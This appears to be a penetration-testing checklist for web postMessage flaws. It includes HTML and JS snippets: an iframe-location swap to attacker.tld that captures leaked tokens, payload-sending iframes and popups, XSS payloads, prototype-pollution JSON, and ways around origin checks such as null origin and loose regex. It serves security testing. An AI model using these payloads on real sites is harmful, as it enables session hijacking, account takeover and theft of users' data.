### 0. Enumerate Messaging (find listeners & senders)

* [ ] DevTools global search (`Ctrl+Shift+F`) for: `postMessage(`, `addEventListener("message"`, `.onmessage`, `.on("message"`
* [ ] DevTools → Sources → **Global Listeners** → "message" handlers
* [ ] Trace the execution flow: where does `event.data` go?
* [ ] Note every `targetWindow.postMessage(...)` call and its `targetOrigin`
* [ ] Browser extensions: MessPostage / Posta / PMHook / postMessage-tracker / benso-io/posta to log messages + handlers live

***

### 1. Analyze the Listener's Validation

* [ ] Does it check `event.origin` at all? (none = drive it from any origin)
* [ ] Is the check strict equality (`===` to a fixed origin) or weak (substring/regex)?
* [ ] Does it check `event.source`? `event.isTrusted`?
* [ ] What does `event.data` flow into — a sink, prototype merge, or a state change?
* [ ] Is `event.data` `JSON.parse`'d then used in `innerHTML`/`eval`/etc.?

***

### 2. Attack the SENDER (wildcard targetOrigin leak)

> If a page sends sensitive data with `targetOrigin = "*"` and is iframeable (no X-Frame-Options/CSP frame-ancestors), you can steal it.

* [ ] Confirm a `postMessage(secret, "*")` call (tokens, email, PII)
* [ ] Confirm the page has no frame-busting (X-Frame-Options / CSP `frame-ancestors`)
*   [ ] Iframe the page, then change the iframe's `location` to your domain right before/while it sends:

    ```html
    <iframe src="https://victim.tld"></iframe>
    <script>setTimeout(()=>{ window.frames[0].location="https://attacker.tld/exploit.html" },6000)</script>
    ```
* [ ] Nested-iframe variant: if the victim iframes a child that receives a `*` message, navigate the child iframe to attacker origin
* [ ] Catch the leaked message on your exploit page's listener
* [ ] Note: if `targetOrigin` is a real URL (not `*`), this won't work

***

### 3. Attack the RECEIVER (missing/loose origin check)

> If the listener doesn't validate origin, you send arbitrary `event.data` → XSS or state change (e.g. change victim's password).

*   [ ] **Send to an iframe (no X-Frame block):**

    ```html
    <iframe src="https://victim.tld" onload="this.contentWindow.postMessage(PAYLOAD,'*')"></iframe>
    ```
* [ ] **Send to an iframe by id:** `document.getElementById('f').contentWindow.postMessage(PAYLOAD,'*')`
* [ ] **Send to a popup** (when framing is blocked — §6): `win=open('https://victim.tld'); win.postMessage(PAYLOAD,'*')`
* [ ] **DOM XSS** — get `event.data` into a sink:
  * `document.write`/`writeln`, `innerHTML`/`outerHTML`, `insertAdjacentHTML`
  * `location`/`location.href`/`location.replace`/`window.open` with `javascript:`/`data:`
  * `eval`, `setTimeout(str)`, `Function`, jQuery `$(data)`
  * script element `.src`/`.text`/`.textContent`, or `href`/`src` of A/IFRAME/EMBED/OBJECT
  * Example payload: `<img src=0 onerror=alert(document.domain)>`
* [ ] **Prototype pollution** via JSON message: `{"__proto__":{"isAdmin":true}}` → then chain to XSS/logic
* [ ] **State change**: replay/forge the message that triggers a sensitive action (password change, token use)

***

### 4. Origin-Check Bypasses

* [ ] **`indexOf`**: `if(origin.indexOf("https://legit.com")===-1)` → bypass with `https://legit.com.attacker.site` (or attacker controls a path `https://attacker/https://legit.com`)
* [ ] **`String.search(origin)`**: arg treated as **regex** → `.` is wildcard → register `legit.matesite.com` to match `legitXmatesite.com`-style, or `www.s.fedomain.com`
* [ ] **`match()`**: same regex pitfall as `search`
* [ ] **Unescaped dots in regex**: `/^https*:\/\/(mail|www).google.com$/` → `.` matches anything → `mailXgoogle.com`
* [ ] **Missing `$` anchor**: `/^https:\/\/www\.google\.com/` (no `$`) → `https://www.google.com.attacker.com` passes
* [ ] **Prefix/suffix-only checks** (`startsWith`/`endsWith`) → satisfy with subdomain/path
* [ ] **`escapeHtml` overwrite bug**: function overwrites props of existing object; a controlled prop not responding to `hasOwnProperty` escapes sanitization

***

### 5. Null-Origin & `e.source` Bypasses

*   [ ] **`e.origin === window.origin` bypass**: sandboxed iframe + popup both get origin `null` → `null === null` passes:

    ```js
    f.sandbox='allow-scripts allow-popups allow-top-navigation';
    f.srcdoc=`... let w=open('https://victim/iframe.php'); setTimeout(_=>{ w.postMessage({type:'render',body:'<audio/src/onerror="PAYLOAD">'},'*') },1000);`
    ```
* [ ] **Spoof `e.source`** to `null`: create an iframe that sends the message then is immediately removed
* [ ] Test same-window-only checks (extensions' content scripts) for these tricks

***

### 6. Frame-Busting / Relay Bypasses

*   [ ] **X-Frame-Options / frame-ancestors present?** → use a popup instead of iframe:

    ```js
    var w=window.open("https://victim.tld"); setTimeout(()=>{ w.postMessage(PAYLOAD,'*') },2000);
    ```
* [ ] **Relay/echo page (origin-only validation)**: find a page on a _trusted_ origin (marketing/analytics SDK) that forwards attacker-controlled query params via `postMessage` → message now comes from the trusted origin → passes origin-only checks → inject tokens/state (e.g. `FACEBOOK_IWL_BOOTSTRAP`-style)
* [ ] Open victim in popup/iframe with an `opener` so SDK listeners that only attach when `window.opener` exists register
* [ ] **Block-main-page** trick: stall the main page before it consumes a message, abuse an XSS in a child to leak it first

***

### 7. Tooling

* [ ] **Posta** / **benso-io/posta** (track, replay, exploit cross-document messages)
* [ ] **PMHook** (TamperMonkey — wraps `addEventListener`, logs handlers + received messages, replay tool that mutates hostnames to test regex flaws)
* [ ] **MessPostage** / **postMessage-tracker** (fransr) browser extensions
* [ ] DevTools Global Listeners + `Ctrl+Shift+F`
* [ ] DOM Invader (web-message testing)

***

### 8. Confirm Impact

* [ ] DOM XSS (data → sink) → session hijack / ATO
* [ ] Sensitive-message theft (wildcard sender + iframe location swap) → token/PII leak
* [ ] State change driven by forged message (password change, privileged action)
* [ ] Prototype pollution → XSS / auth bypass
* [ ] Origin-validation bypass demonstrated end-to-end from an attacker origin
* [ ] Re-verify on a clean session; document the listener, the validation flaw (none/indexOf/search/regex/null-origin), the sink, and whether iframe or popup delivery was used

```
```

</details>
